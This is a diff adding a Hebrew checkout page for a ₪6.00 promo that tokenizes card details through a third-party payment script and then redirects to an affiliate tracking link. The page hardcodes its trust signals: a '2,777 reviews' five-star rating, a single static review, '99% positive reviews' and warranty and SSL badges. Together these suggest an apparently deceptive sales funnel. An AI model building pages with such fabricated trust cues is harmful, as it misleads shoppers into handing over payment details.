@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>תשלום מאובטח — שלב 2</title>
+
+<meta name="referrer" content="no-referrer">
+
+<script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+<script data-main="payment-js" src="https://api.xolvispay.com/js/integrated/payment.1.3.min.js"></script>
+<style>
+:root{--bg:#fafafa;--text:#0a2540;--muted:#5b6b82;--line:#e5e7eb;}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+margin:0;
+background:var(--bg);
+color:var(--text);
+font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+}
+
+.safe{
+background:#0a0a0a;
+color:#fff;
+font-size:12px;
+padding:6px 10px;
+}
+
+.wrap{
+max-width:1100px;
+margin:0 auto;
+padding:18px 14px 60px;
+}
+
+.page-title{
+font-size:28px;
+font-weight:900;
+display:flex;
+align-items:center;
+gap:8px;
+margin:6px 0 14px;
+}
+
+.stars{color:#f6b80c}
+.reviews{color:#5b6b82;font-size:13px}
+
+.grid{
+display:grid;
+grid-template-columns:360px minmax(0,1fr);
+gap:18px;
+}
+
+@media(max-width:980px){
+.grid{grid-template-columns:1fr}
+}
+
+.card{
+background:#fff;
+border:1px solid var(--line);
+padding:22px;
+border-radius:12px;
+min-height:430px;
+}
+
+.h2{
+font-size:18px;
+font-weight:800;
+margin:10px 0 14px;
+}
+
+.sub{
+font-size:13px;
+color:#5b6b82;
+}
+
+.el{
+width:100%;
+border:1px solid #cfd6e4;
+border-radius:10px;
+padding:12px;
+font-size:15px;
+background:#fff;
+}
+
+#card-element{
+width:100%;
+border:1px solid #cfd6e4;
+border-radius:10px;
+padding:0;
+background:#fff;
+min-height:90px;
+margin-top:14px;
+overflow:hidden;
+}
+
+.btn{
+width:100%;
+padding:12px;
+border:none;
+border-radius:12px;
+background:#16a34a;
+color:#fff;
+font-weight:900;
+cursor:pointer;
+font-size:15px;
+}
+
+.btn:disabled{
+opacity:.65;
+cursor:not-allowed;
+}
+
+.err{
+display:none;
+background:#fff1f1;
+border:1px solid #f5bcbc;
+padding:10px;
+border-radius:10px;
+margin-top:12px;
+color:#9a1a1a;
+}
+
+.err[aria-hidden="false"]{display:block}
+
+.widget{
+background:#fff;
+border:1px solid var(--line);
+padding:16px;
+border-radius:12px;
+}
+
+.widget + .widget{margin-top:12px}
+
+.order-row{
+display:flex;
+justify-content:space-between;
+padding:6px 0;
+border-top:1px dashed #e6eaf1;
+}
+
+.delivery{
+display:flex;
+gap:12px;
+padding:12px;
+border:1px dashed #d9e2ef;
+border-radius:10px;
+background:#f7fbff;
+align-items:center;
+}
+
+.trust{
+display:grid;
+grid-template-columns:1fr 1fr 1fr;
+gap:12px;
+text-align:center;
+}
+
+.trust .box{
+border:1px solid var(--line);
+padding:8px;
+border-radius:10px;
+}
+
+.loading-overlay{
+position:fixed;
+inset:0;
+background:rgba(246,249,252,.92);
+display:none;
+align-items:center;
+justify-content:center;
+z-index:9999;
+}
+
+.loading-overlay[aria-hidden="false"]{display:flex}
+
+.loading-box{
+width:min(92vw,460px);
+background:#fff;
+border:1px solid #e6edf5;
+border-radius:14px;
+padding:24px;
+text-align:center;
+}
+
+.loading-title{
+font-size:20px;
+font-weight:800;
+margin-bottom:18px;
+}
+
+.progress-wrap{
+width:100%;
+height:12px;
+background:#ecf1f8;
+border-radius:999px;
+overflow:hidden;
+}
+
+.progress-bar{
+width:0%;
+height:100%;
+background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
+animation:loadingBar 2.2s ease-in-out infinite;
+}
+
+@keyframes loadingBar{
+0%{width:0%}
+60%{width:80%}
+100%{width:100%}
+}
+</style>
+</head>
+
+<body>
+
+<div class="safe">רכישה מאובטחת SSL</div>
+
+<div class="wrap">
+
+<div class="page-title">
+תשלום מאובטח 🔒 <span class="stars">★★★★★</span>
+<span class="reviews">(2,777 חוות דעת)</span>
+</div>
+
+<div class="grid">
+
+<div class="card">
+
+<div class="h2">2. פרטי תשלום</div>
+<p class="sub">פרטי כרטיס האשראי שלך מוצפנים ומעובדים בצורה מאובטחת לחלוטין.</p>
+
+<div style="margin-top:14px;">
+    <label for="cardholder-name" style="display:block;font-weight:700;margin-bottom:6px;">
+        שם מלא של בעל הכרטיס
+    </label>
+    <input
+        type="text"
+        id="cardholder-name"
+        class="el"
+        placeholder="ישראל ישראלי"
+        autocomplete="cc-name"
+        required
+    >
+</div>
+
+<div style="margin-top:14px;">
+    <label style="display:block;font-weight:700;margin-bottom:6px;">
+        מספר כרטיס אשראי
+    </label>
+    <div
+        id="number_div"
+        style="height:44px;border:1px solid #cfd6e4;border-radius:10px;padding:11px;background:#fff;"
+    ></div>
+</div>
+
+<div style="margin-top:14px;">
+    <label style="display:block;font-weight:700;margin-bottom:6px;">
+        קוד אבטחה (CVV)
+    </label>
+    <div
+        id="cvv_div"
+        style="height:44px;border:1px solid #cfd6e4;border-radius:10px;padding:11px;background:#fff;"
+    ></div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px;">
+    <div>
+        <label for="exp_month" style="display:block;font-weight:700;margin-bottom:6px;">
+            חודש תוקף
+        </label>
+        <input
+            type="text"
+            id="exp_month"
+            class="el"
+            placeholder="MM"
+            inputmode="numeric"
+            autocomplete="cc-exp-month"
+            required
+        >
+    </div>
+
+    <div>
+        <label for="exp_year" style="display:block;font-weight:700;margin-bottom:6px;">
+            שנת תוקף
+        </label>
+        <input
+            type="text"
+            id="exp_year"
+            class="el"
+            placeholder="YYYY"
+            inputmode="numeric"
+            autocomplete="cc-exp-year"
+            required
+        >
+    </div>
+</div>
+
+<div id="err" class="err" aria-hidden="true"></div>
+
+<div style="display:flex;gap:10px;margin-top:12px">
+<button id="backBtn" class="btn" style="width:40%">חזור</button>
+<button id="payNow" class="btn" style="width:60%">בצע תשלום מאובטח</button>
+</div>
+
+</div>
+
+<aside>
+
+<div id="productBox" class="widget" style="display:none">
+<img id="productImg" style="width:100%;border-radius:12px;margin-bottom:12px;display:none">
+<div id="productTitle" style="font-weight:900;font-size:18px"></div>
+</div>
+
+<div class="widget">
+<div style="text-align:center;font-weight:800">חוות דעת לקוחות</div>
+<div style="text-align:center;font-weight:700;">פנלה לארה</div>
+<div style="text-align:center;color:#f6b80c;">★★★★★</div>
+<p style="text-align:center">קיבלתי את המוצר שלי אתמול. חוויה נהדרת!</p>
+</div>
+
+<div class="widget">
+<div class="delivery">
+<div>
+<div style="font-weight:800">משלוח מהיר</div>
+<div class="sub">גישה דיגיטלית מיידית</div>
+</div>
+<div style="margin-left:auto;font-weight:800">חינם</div>
+</div>
+
+<div style="margin-top:14px;font-weight:800">סיכום הזמנה</div>
+<div class="order-row"><span>סה"כ</span><span>₪6.00</span></div>
+</div>
+
+<div class="widget">
+<div style="font-weight:800;margin-bottom:10px">למה לסמוך עלינו</div>
+<div class="trust">
+<div class="box"><div>⭐</div><div>99% ביקורות חיוביות</div></div>
+<div class="box"><div>🔒</div><div>חיבור SSL מאובטח</div></div>
+<div class="box"><div>🛡️</div><div>אחריות מלאה</div></div>
+</div>
+</div>
+
+</aside>
+
+</div>
+</div>
+
+<div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+<div class="loading-box">
+<div class="loading-title">מעבד תשלום…</div>
+<div class="progress-wrap"><div class="progress-bar"></div></div>
+<p class="sub" style="margin-top:10px">אנא המתן מספר שניות…</p>
+</div>
+</div>
+
+<script>
+const tokenFromServer = window.PROMO_CHECKOUT_TOKEN || null;
+const publicIntegrationKey = window.XOLVIS_PUBLIC_INTEGRATION_KEY || "";
+
+const pageParams = new URLSearchParams(location.search);
+const productTitleFromUrl = pageParams.get("sub1") || "";
+const productImageFromUrl = pageParams.get("sub2") || "";
+
+const err = document.getElementById("err");
+const payNow = document.getElementById("payNow");
+const backBtn = document.getElementById("backBtn");
+const overlay = document.getElementById("loading-overlay");
+
+let payment = null;
+let paymentReady = false;
+
+function showError(message) {
+    err.textContent = message;
+    err.setAttribute("aria-hidden", "false");
+}
+
+function clearError() {
+    err.textContent = "";
+    err.setAttribute("aria-hidden", "true");
+}
+
+function setLoading(isLoading) {
+    payNow.disabled = isLoading;
+    overlay.setAttribute("aria-hidden", isLoading ? "false" : "true");
+}
+
+window.addEventListener("DOMContentLoaded", () => {
+    const productBox = document.getElementById("productBox");
+    const productTitle = document.getElementById("productTitle");
+    const productImg = document.getElementById("productImg");
+
+    if (productTitleFromUrl) {
+        productTitle.textContent = productTitleFromUrl;
+        productBox.style.display = "block";
+    }
+
+    if (productImageFromUrl) {
+        productImg.src = productImageFromUrl;
+        productImg.style.display = "block";
+        productBox.style.display = "block";
+    }
+
+    if (!tokenFromServer) {
+        showError("קישור התשלום פג תוקף או אינו תקין.");
+        payNow.disabled = true;
+        return;
+    }
+
+    if (!publicIntegrationKey) {
+        showError("חסרה הגדרת תצורת תשלום.");
+        payNow.disabled = true;
+        return;
+    }
+
+    try {
+        payment = new PaymentJs();
+        payment.init(
+            publicIntegrationKey,
+            "number_div",
+            "cvv_div",
+            function (paymentInstance) {
+                paymentReady = true;
+                paymentInstance.setNumberPlaceholder("מספר כרטיס");
+                paymentInstance.setCvvPlaceholder("CVV");
+
+                paymentInstance.setNumberStyle({
+                    "font-size": "16px",
+                    "font-family": "Arial, Helvetica, sans-serif",
+                    "color": "#33302c"
+                });
+
+                paymentInstance.setCvvStyle({
+                    "font-size": "16px",
+                    "font-family": "Arial, Helvetica, sans-serif",
+                    "color": "#33302c"
+                });
+
+                payNow.disabled = false;
+            }
+        );
+    } catch (error) {
+        showError(error?.message || "לא ניתן לטעון את שדות התשלום.");
+        payNow.disabled = true;
+    }
+});
+
+backBtn.onclick = () => { window.history.back(); };
+
+payNow.onclick = () => {
+    clearError();
+
+    if (!tokenFromServer) {
+        showError("קישור תשלום לא תקין.");
+        return;
+    }
+
+    if (!paymentReady || !payment) {
+        showError("שדות התשלום עדיין נטענים. נא להמתין.");
+        return;
+    }
+
+    const cardholderName = document.getElementById("cardholder-name").value.trim();
+    const expMonth = document.getElementById("exp_month").value.trim();
+    const expYear = document.getElementById("exp_year").value.trim();
+
+    if (!cardholderName || !expMonth || !expYear) {
+        showError("נא למלא את כל פרטי כרטיס האשראי.");
+        return;
+    }
+
+    setLoading(true);
+
+    payment.tokenize(
+        {
+            card_holder: cardholderName,
+            month: expMonth,
+            year: expYear
+        },
+        async function (transactionToken, cardData) {
+            try {
+                const response = await fetch("/api/create-promo-payment", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        checkoutToken: tokenFromServer,
+                        cardholderName: cardholderName,
+                        transactionToken: transactionToken,
+                        cardData: cardData
+                    })
+                });
+
+                const text = await response.text();
+                let data;
+                try { data = JSON.parse(text); } catch {
+                    throw new Error("תגובת שרת לא תקינה.");
+                }
+
+                if (!response.ok || data.success === false || data.returnType === "ERROR") {
+                    throw new Error(data.error || data.errorMessage || "התשלום נכשל.");
+                }
+
+                if (data.returnType === "REDIRECT" && data.redirectUrl) {
+                    window.location.href = data.redirectUrl;
+                    return;
+                }
+
+                const qs = new URLSearchParams(location.search);
+                window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?" +
+                    "ref=" + encodeURIComponent(qs.get("ref") || "") +
+                    "&sub1=" + encodeURIComponent(qs.get("sub1") || "") +
+                    "&sub2=" + encodeURIComponent(qs.get("sub2") || "");
+
+            } catch (error) {
+                setLoading(false);
+                showError(error?.message || "שגיאה בעיבוד התשלום.");
+            }
+        },
+        function (errors) {
+            setLoading(false);
+            showError("נא לבדוק את פרטי הכרטיס ולנסות שוב.");
+        }
+    );
+};
+</script></body>
+</html>
